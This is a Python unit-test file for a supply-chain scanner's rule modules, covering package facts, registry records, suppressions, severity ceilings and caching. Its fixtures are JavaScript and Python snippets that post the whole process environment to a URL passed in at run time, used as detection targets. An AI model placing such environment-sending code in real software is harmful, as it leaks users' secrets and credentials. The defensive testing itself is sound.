"""The `package`, `js` and `python` rule modules (`detect/binary/modules/scanner_facts`) and the rule
file's deferred pass (`engine/pipeline/facts`): each field reads a fact the scanner computes;
where there is none it is undefined, never false; a deferred match takes every step after detection a
finding takes; and an answer depending on the facts is never kept by the file's bytes alone."""

from __future__ import annotations

import io
import json
import tarfile
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from typing import Any, ClassVar

import pytest

from cordon_scanner import Scanner
from cordon_scanner.detect.binary.modules.scanner_facts.facts import ScanFacts
from cordon_scanner.detect.binary.modules.scanner_facts.js import Js
from cordon_scanner.detect.binary.modules.scanner_facts.package import Package
from cordon_scanner.detect.binary.modules.scanner_facts.python import Python
from cordon_scanner.detect.binary.rule_engine.lang import Rules
from cordon_scanner.engine.pipeline.facts import ScanFactsGathering
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.foundation.models import Suppression

# The fixture of tests/unit/detect/code/test_reached_flows.py, verbatim: the environment posted to
# an address the file does not name.
SENDS = (
    "function send(url) {\n"
    '  fetch(url, { method: "POST", body: JSON.stringify(process.env) });\n'
    "}\n"
    "send(process.argv[2]);\n"
)
# The fixture of tests/unit/analysis/python/test_py_flow_facts.py, verbatim.
PY_SENDS = (
    "import os, requests\ndef send(url):\n    requests." + "post(url, data=dict(os.env" + "iron))\n"
)

MATCH = "SUSPECT.RULEFILE.MATCH.001"


class Fixture:
    @staticmethod
    def tgz(files: dict[str, bytes]) -> bytes:
        out = io.BytesIO()
        with tarfile.open(fileobj=out, mode="w:gz") as archive:
            for name, data in files.items():
                info = tarfile.TarInfo("package/" + name)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        return out.getvalue()

    @staticmethod
    def package(main: str = "index.js", extra: dict[str, bytes] | None = None) -> dict[str, bytes]:
        manifest = {"name": "p", "version": "1.0.0", "main": main}
        return {
            "package.json": json.dumps(manifest).encode(),
            "index.js": SENDS.encode(),
            **(extra or {}),
        }

    @staticmethod
    def scan(
        tmp_path: Path, rules: str, target: Path, config: Config | None = None, **overrides: Any
    ) -> set[tuple[str, str]]:
        """(rule name, file) for every rule-file match, and the findings themselves."""
        path = tmp_path / "rules.yar"
        path.write_text(rules, encoding="utf-8")
        config = (config or Config.default()).with_overrides(
            use_cache=False, rule_file=str(path), **overrides
        )
        return Fixture.found(Scanner(config).scan(target).findings)

    @staticmethod
    def found(findings: Any) -> set[tuple[str, str]]:
        return {
            (dict(f.evidence.metadata)["rule"], f.location.path.rpartition("/")[2])
            for f in findings
            if f.rule_id == MATCH
        }

    @staticmethod
    def archive(tmp_path: Path, files: dict[str, bytes], name: str = "p-1.0.0.tgz") -> Path:
        path = tmp_path / name
        path.write_bytes(Fixture.tgz(files))
        return path

    @staticmethod
    def ctx(**paths: frozenset[str]) -> Any:
        empty: frozenset[str] = frozenset()
        return SimpleNamespace(
            agent_run_paths=paths.get("agent", empty),
            install_hook_paths=paths.get("install", empty),
            install_entry_paths=empty,
            import_entry_paths=paths.get("entries", empty),
            library_closure_paths=paths.get("closure", empty),
            ci_hook_paths=paths.get("ci", empty),
        )


class TestThePackageModule:
    RULES = (
        'import "package"\nimport "js"\n'
        'rule placed { condition: package.place == "import" }\n'
        'rule flowing { condition: package.flow("import", "environment", "request", "") }\n'
        'rule any_import_flow { condition: package.flow("import", "", "", "") }\n'
        'rule install_flow { condition: package.flow("install", "", "", "") }\n'
        'rule file_flow { condition: js.flow("environment", "request", "unknown") }\n'
        'rule named { condition: package.name == "p" and package.version == "1.0.0" '
        'and package.ecosystem == "npm" }\n'
        "rule no_record { condition: not package.registry.known "
        "and not defined package.registry.age_days }\n"
    )

    def test_each_field_reads_the_fact_for_the_file_it_matches(self, tmp_path: Path) -> None:
        found = Fixture.scan(tmp_path, self.RULES, Fixture.archive(tmp_path, Fixture.package()))
        assert ("placed", "index.js") in found and ("placed", "package.json") not in found
        assert ("file_flow", "index.js") in found and ("file_flow", "package.json") not in found
        for rule in ("flowing", "any_import_flow", "named", "no_record"):
            assert {(rule, "index.js"), (rule, "package.json")} <= found
        assert not any(rule == "install_flow" for rule, _ in found)

    def test_code_nothing_runs_has_no_place_and_no_flow(self, tmp_path: Path) -> None:
        files = Fixture.package(main="other.js", extra={"other.js": b"module.exports = 1;\n"})
        found = Fixture.scan(tmp_path, self.RULES, Fixture.archive(tmp_path, files))
        assert ("placed", "other.js") in found and ("placed", "index.js") not in found
        assert not any(rule == "flowing" for rule, _ in found)  # the entry sends nothing
        assert ("file_flow", "index.js") in found  # the file's own flows, wherever it is

    def test_campaign_and_identity_are_undefined_without_their_facts(self) -> None:
        values = Package.values({}, "a.js", Fixture.ctx())
        assert "campaign" not in values and "name" not in values
        assert values["registry"] == {"known": False}

    def test_a_campaign_is_read_for_the_package_the_file_is_in(self) -> None:
        facts = {"campaign": {"p.tgz": [2, 3]}}
        assert Package.values(facts, "p.tgz!package/a.js", Fixture.ctx())["campaign"] == {
            "siblings": 2,
            "shared": 3,
        }

    def test_an_agents_script_is_the_agent_place_though_it_is_an_install_path(self) -> None:
        ctx = Fixture.ctx(agent=frozenset({"s.py"}), install=frozenset({"s.py"}))
        assert ScanFacts.place("s.py", ctx) == "agent"


class TestTheFileModules:
    @staticmethod
    def content(path: str, text: str) -> FileContent:
        return FileContent.from_bytes(path, text.encode())

    def test_a_javascript_files_flows(self) -> None:
        values = Js.values("index.js", Fixture.ctx(), self.content("index.js", SENDS))
        flow = values["flow"][0]
        assert flow(b"environment", b"request", b"unknown") and flow(b"", b"", b"")
        assert not flow(b"wallet_key", b"", b"")
        assert values["sinks"] == {0: b"request"} and values["flows"] >= 1

    def test_a_python_files_flows(self) -> None:
        values = Python.values("send.py", Fixture.ctx(), self.content("send.py", PY_SENDS))
        assert values["flow"][0](b"environment", b"request", b"unknown")

    @pytest.mark.parametrize(
        ("module", "path"),
        [(Js, "send.py"), (Python, "index.js"), (Js, "notes.txt"), (Python, "notes.txt")],
    )
    def test_a_file_of_another_language_has_every_field_undefined(
        self, module: Any, path: str
    ) -> None:
        text = PY_SENDS if path.endswith(".py") else SENDS
        assert module.values(path, Fixture.ctx(), self.content(path, text)) == {}

    def test_a_file_past_the_readers_size_has_every_field_undefined(self) -> None:
        big = SENDS + "//" + "x" * 1_000_001 + "\n"
        assert Js.values("index.js", Fixture.ctx(), self.content("index.js", big)) == {}

    def test_outside_a_scan_every_field_is_undefined(self) -> None:
        rules = Rules.compile(
            'import "package" import "js" import "python" rule r { condition: '
            "defined package.place or defined js.flows or defined python.flows }"
        )
        assert not rules.match(b"x")


class TestTheRegistryRecord:
    """Condition 4: readable in a normal scan; never in a content-only one."""

    REG: ClassVar[dict[str, float]] = {
        "reg_known": 1.0,
        "reg_prior_versions": 3.0,
        "reg_first_release": 0.0,
    }

    @staticmethod
    def gathered(monkeypatch: pytest.MonkeyPatch, reg: dict[str, float]) -> dict[str, Any]:
        monkeypatch.setattr(ScanFactsGathering, "verdict", staticmethod(lambda *a: dict(reg)))
        monkeypatch.setattr(ScanFactsGathering, "campaigns", staticmethod(lambda *a: {}))
        return ScanFactsGathering.gather(None, [], Fixture.ctx(), {})[1]  # type: ignore[arg-type]

    def test_a_normal_scan_reads_the_record(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ScanFactsGathering.CONTENT_ONLY, raising=False)
        registry = Package.values(self.gathered(monkeypatch, self.REG), "a", Fixture.ctx())
        assert registry["registry"] == {"known": True, "prior_versions": 3, "first_release": False}

    def test_a_content_only_run_reads_none_of_it(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(ScanFactsGathering.CONTENT_ONLY, "1")
        registry = Package.values(self.gathered(monkeypatch, self.REG), "a", Fixture.ctx())
        assert registry["registry"] == {"known": False}

    def test_nothing_acquired_is_known_false(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ScanFactsGathering.CONTENT_ONLY, raising=False)
        registry = Package.values(self.gathered(monkeypatch, {}), "a", Fixture.ctx())
        assert registry["registry"] == {"known": False}


class TestTheDeferredPass:
    DEFERRED = 'import "js"\nrule sends { condition: js.flows > 0 }\n'
    PLAIN = 'rule sends { strings: $a = "process.env" condition: $a }\n'

    def test_a_suppression_applies_to_a_deferred_match(self, tmp_path: Path) -> None:
        """Condition 1: a deferred match is suppressed as any finding is (in a directory scan,
        where suppressions apply)."""
        target = tmp_path / "repo"
        target.mkdir()
        (target / "index.js").write_text(SENDS, encoding="utf-8")
        path = tmp_path / "rules.yar"
        path.write_text(self.DEFERRED, encoding="utf-8")
        config = Config.default().with_overrides(use_cache=False, rule_file=str(path))
        found = [f for f in Scanner(config).scan(target).findings if f.rule_id == MATCH]
        assert found and all(f.suppressed is None for f in found)
        held = Suppression(
            rule=MATCH, path=found[0].location.path, justification="x" * 40, expires="2099-01-01"
        )
        result = Scanner(replace(config, suppressions=(held,))).scan(target)
        again = [f for f in result.findings if f.rule_id == MATCH]
        assert again and all(f.suppressed is not None for f in again)

    def test_a_ceiling_lowers_a_deferred_match_as_it_lowers_any(self, tmp_path: Path) -> None:
        """Condition 1: in a repository, a script a person runs by name is reported below the
        gate (`Ceilings.person_run_ceiling`), deferred or not."""
        repo = tmp_path / "repo"
        (repo / "tools").mkdir(parents=True)
        # an extensionless node script: a tool a person runs, read as JavaScript by its #! line
        (repo / "tools" / "release").write_text("#!/usr/bin/env node\n" + SENDS, encoding="utf-8")
        severities = []
        for rules in (self.DEFERRED, self.PLAIN):
            path = tmp_path / "rules.yar"
            path.write_text(rules, encoding="utf-8")
            config = Config.default().with_overrides(use_cache=False, rule_file=str(path))
            found = [f for f in Scanner(config).scan(repo).findings if f.rule_id == MATCH]
            assert len(found) == 1
            severities.append(found[0].severity)
        assert severities[0] == severities[1]
        assert severities[0].name == "MEDIUM"  # lowered from the rule-file match's HIGH

    def test_the_same_bytes_under_other_facts_give_other_answers(self, tmp_path: Path) -> None:
        """Condition 2: with the caches on, a file's answer under one package's facts is never
        served under another's: the same `index.js` is an entry point in one, not the other."""
        rules = 'import "package"\nrule placed { condition: package.place == "import" }\n'
        path = tmp_path / "rules.yar"
        path.write_text(rules, encoding="utf-8")
        config = Config.default().with_overrides(use_cache=True, rule_file=str(path))
        entry = Fixture.archive(tmp_path, Fixture.package(), "a-1.0.0.tgz")
        other = Fixture.package(main="other.js", extra={"other.js": b"module.exports = 1;\n"})
        not_entry = Fixture.archive(tmp_path, other, "b-1.0.0.tgz")
        assert ("placed", "index.js") in Fixture.found(Scanner(config).scan(entry).findings)
        assert ("placed", "index.js") not in Fixture.found(Scanner(config).scan(not_entry).findings)
        assert ("placed", "index.js") in Fixture.found(Scanner(config).scan(entry).findings)

    def test_a_rule_set_reading_no_facts_is_matched_during_detection(self, tmp_path: Path) -> None:
        from cordon_scanner.detect.binary.rule_files import RuleFileDetector

        path = tmp_path / "rules.yar"
        path.write_text(self.PLAIN, encoding="utf-8")
        ctx = SimpleNamespace(
            config=SimpleNamespace(rule_file=str(path), rule_module_data=(), use_cache=False)
        )
        assert RuleFileDetector().defers(ctx) is False  # type: ignore[arg-type]
        path.write_text(self.DEFERRED, encoding="utf-8")
        assert RuleFileDetector().defers(ctx) is True  # type: ignore[arg-type]
